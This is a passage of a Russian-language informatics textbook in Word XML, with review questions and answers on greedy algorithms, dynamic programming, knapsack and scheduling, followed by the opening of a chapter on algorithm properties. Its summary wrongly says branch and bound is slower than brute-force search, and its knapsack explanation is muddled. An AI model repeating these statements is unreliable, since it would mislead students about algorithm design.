    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Теоретические:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое функциональная задача? Приведите пример.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: задача с чётким входом, процессом и выходом._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Чем отличаются алгоритмическая и эвристическая модели?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: алгоритмическая = точное решение, эвристическая = приближённое._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое системный подход? Назовите его основные принципы.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: декомпозиция, анализ, синтез, учёт взаимосвязей._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое эмерджентность? Приведите пример.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: "целое больше суммы частей"; пример: мозг умнее отдельного нейрона._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Чем отличается жадный алгоритм от динамического программирования?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: жадный = локально оптимальный выбор, ДП = запоминание подзадач._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**В каких случаях жадный алгоритм не даёт оптимального решения?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: когда локально оптимальные выборы не приводят к глобальному оптимуму (пример: задача 0-1 Knapsack)._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое декомпозиция задачи? Зачем она нужна?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: разбиение на подзадачи; упрощает решение._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Практические:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Решите задачу о размене 27 рублей монетами номиналом 10, 5, 1 рубль. Используйте жадный алгоритм. Минимизируйте количество монет.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Ответ:_ 10 + 10 + 5 + 1 + 1 = 5 монет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Вычислите 10-е число Фибоначчи с помощью динамического программирования.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Ответ:_ F(10) = 55 (последовательность: 0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Задача коммивояжёра. 3 города, расстояния: A-B=10, B-C=15, A-C=20. Найдите кратчайший маршрут, начинающийся и заканчивающийся в A.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_ A → B → C → A = 10 + 15 + 20 = 45 км (или A → C → B → A = 20 + 15 + 10 = 45 км).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Задача о рюкзаке. Вместимость 7 кг, предметы: (вес=2, цена=10), (вес=3, цена=15), (вес=4, цена=20), (вес=5, цена=25). Найдите максимальную ценность (используйте жадный алгоритм по плотности).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_ Плотность: 5.0, 5.0, 5.0, 5.0 (все одинаковые). Берём (2, 10) + (3, 15) = вес 5, ценность 25. Остаток 2 кг, берём предмет весом 2 не можем (уже взяли). Итого: 25 ₽ (не оптимум, оптимум: (3, 15) + (4, 20) = 35 ₽).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Есть 3 задачи: A (время 10 мин), B (время 5 мин), C (время 3 мин). Используйте алгоритм SJF (Shortest Job First) и найдите среднее время ожидания.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_ Порядок: C → B → A. Время ожидания: C=0, B=3, A=8. Среднее = (0+3+8)/3 ≈ 3.67 мин.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Примените метод "разделяй и властвуй" для поиска максимума в массиве [3, 8, 2, 5, 9, 1, 7].</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_ Разбиваем: [3, 8, 2] и [5, 9, 1, 7]. Максимум в левой части = 8, в правой = 9. Общий максимум = 9.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Объясните, почему алгоритм бинарного поиска использует метод "разделяй и властвуй".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_ На каждом шаге массив делится пополам, ищется нужная половина, рекурсивно применяется поиск к половине.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Приведите пример задачи, где жадный алгоритм даёт оптимальное решение.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_ Задача о размене (для стандартных номиналов монет), алгоритм Дейкстры (кратчайший путь), минимальное остовное дерево (алгоритм Крускала).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Заключение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Модели решения функциональных задач и системный подход — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>инструменты мышления</w:t>
      </w:r>
      <w:r>
        <w:t>. Когда ты сталкиваешься с реальной задачей, ты должен понимать:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Какая модель подходит?** (алгоритмическая, эвристическая, оптимизационная)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Какой метод использовать?** (жадный алгоритм, ДП, разделяй и властвуй, ветви и границы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Можно ли разбить задачу на подзадачи?** (декомпозиция, системный подход)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Главное:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Жадный алгоритм** — быстро, просто, но не всегда оптимально</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Динамическое программирование** — оптимально, но требует памяти и времени на построение таблицы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Разделяй и властвуй** — эффективно, когда задачу можно разбить на независимые подзадачи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ветви и границы** — точное решение, но медленнее полного перебора</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Эвристики** — когда точное решение невозможно, но нужен практический результат</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Понимание этих методов поможет тебе не только сдать экзамен, но и решать реальные задачи в работе: от алгоритмов на собеседовании до оптимизации бизнес-процессов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В следующих главах (5.1, 5.2) мы перейдём к </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>алгоритмам</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — конкретным способам описания и реализации решений задач.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Следующая глава:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 5.1 Алгоритм и его свойства. Способы описания  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Предыдущая глава:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 4.3 Классификация видов моделирования. Математические модели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 5.1: Алгоритм и его свойства. Способы описания</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Поздравляю, ты дожил до темы, которая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>реально важна</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Не то чтобы предыдущие главы были бесполезны (системы счисления и представление данных — это база), но алгоритмы — это то, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как компьютер вообще что-то делает</w:t>
      </w:r>
      <w:r>
        <w:t>. Без алгоритмов компьютер — это просто дорогой калькулятор, который умеет только мигать огоньками.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Алгоритм — это пошаговая инструкция для решения задачи. Типа рецепта борща: возьми свёклу, нарежь, вари, добавь капусту... Только в программировании борщ называется "отсортировать массив", а свёкла — "входные данные".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 4.4** (Модели решения задач) — там мы разбирали жадные алгоритмы, ДП, разделяй и властвуй</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 5.2** (Алгоритмические конструкции) — там будут конкретные конструкции (условия, циклы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 6.1** (Языки программирования) — алгоритм надо на чём-то реализовать</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 6.2** (Компиляторы и интерпретаторы) — как код превращается в инструкции процессора</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем это нужно?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Потому что на экзамене тебя </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>обязательно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> спросят про свойства алгоритма (дискретность, детерминированность и прочая хрень). А ещё потому что понимание алгоритмов — это основа программирования. Без этого ты будешь как водитель, который не знает, где у машины газ и тормоз.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1.1. Что такое алгоритм</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Определение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм (algorithm)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>конечная последовательность чётко определённых действий</w:t>
      </w:r>
      <w:r>
        <w:t>, необходимых для решения задачи или достижения цели.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Проще говоря: алгоритм — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>пошаговая инструкция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для тупого исполнителя (компьютера, человека, робота). Исполнитель не думает, он просто тупо выполняет шаги один за другим.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры алгоритмов из жизни:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Рецепт приготовления яичницы:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Взять сковородку</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поставить на огонь</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Налить масло</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разбить яйца</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Жарить 3 минуты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выключить огонь</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Готово</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Инструкция "как дойти до магазина":**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выйти из дома</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Повернуть направо</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пройти 100 метров</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Повернуть налево</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Магазин будет справа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Алгоритм утреннего подъёма студента:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Будильник звонит</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нажать "ещё 5 минут"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Повторить 10 раз</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проснуться в панике</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Бежать на пары (опционально)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>История термина</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Слово </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"алгоритм"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> происходит от имени узбекского учёного </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Мухаммада ибн Мусы аль-Хорезми</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (IX век). Он написал книгу "Об индийском счёте", где описал правила арифметических операций. В Европе его имя исказили до "Algorismus", а затем — "алгоритм". По сути, этот чел научил европейцев считать (до этого они мучались с римскими цифрами типа MCMXCIV — попробуй на них умножить столбиком).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Забавный факт:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Римские цифры — это кошмар для арифметики. Попробуй умножить XLII на XVI без калькулятора. Вот именно. Аль-Хорезми принёс в Европу арабские цифры (на самом деле индийские, но европейцы назвали их "арабскими") — и жить стало чуть проще.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1.2. Свойства алгоритма</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>У нормального алгоритма есть 5 обязательных свойств. Если хотя бы одного нет — это не алгоритм, а хрень какая-то. Запоминай:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Дискретность (прерывность, пошаговость)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дискретность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм состоит из </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>отдельных шагов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (дискретных операций). Каждый шаг выполняется за конечное время, затем начинается следующий.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Взять два числа a и b</w:t>
        <w:br/>
        <w:t>2. Сложить их: c = a + b</w:t>
        <w:br/>
        <w:t>3. Вывести результат c</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Это 3 отдельных шага. Нельзя выполнить "полтора шага" или "перепрыгнуть сразу к результату, пропустив сложение".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Анти-пример (не дискретный):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>"Думай о решении задачи, пока не поймёшь, как её решить" — это не алгоритм, потому что процесс "думать" не разбит на чёткие шаги.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Детерминированность (определённость, однозначность)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Детерминированность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — каждый шаг алгоритма </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>однозначно определён</w:t>
      </w:r>
      <w:r>
        <w:t>. Два разных исполнителя при одинаковых входных данных должны получить одинаковый результат.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Простыми словами:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Если ты дал алгоритм двум людям, они должны сделать одно и то же. Никакой "импровизации" или "действуй по ситуации".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример (детерминированный):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Если число чётное, раздели на 2</w:t>
        <w:br/>
        <w:t>Если число нечётное, умножь на 3 и прибавь 1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Анти-пример (недетерминированный):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">"Если погода хорошая, иди пешком, иначе вызови такси" — что значит "хорошая"? Для кого-то +10°C — это хорошо, для кого-то — холодно. Алгоритм должен </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>точно определить</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> условие.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правильная версия:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>"Если температура выше +15°C и нет дождя, иди пешком, иначе вызови такси".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Конечность (результативность за конечное время)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Конечность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм должен </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>завершиться за конечное число шагов</w:t>
      </w:r>
      <w:r>
        <w:t>. Нельзя, чтобы он работал бесконечно (если, конечно, это не специально — серверы и операционные системы работают "бесконечно", но это исключения).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1 (алгоритм завершается):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Считать от 1 до 10</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Чётко 10 шагов, затем конец.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2 (алгоритм НЕ завершается):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Пока 2×2 = 4, выводи "привет"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">2×2 всегда равно 4 → бесконечный цикл → алгоритм </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не завершается</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> → это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не алгоритм</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (ну или баг).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3 (Гипотеза Коллатца — неизвестно, завершается ли):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Взять любое натуральное число n</w:t>
        <w:br/>
        <w:t>2. Если n чётное, разделить на 2</w:t>
        <w:br/>
        <w:t>3. Если n нечётное, умножить на 3 и прибавить 1</w:t>
        <w:br/>
        <w:t>4. Повторять, пока n ≠ 1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для всех проверенных чисел (до 2^68) алгоритм завершается. Но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>математически не доказано</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, что он завершится для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>любого</w:t>
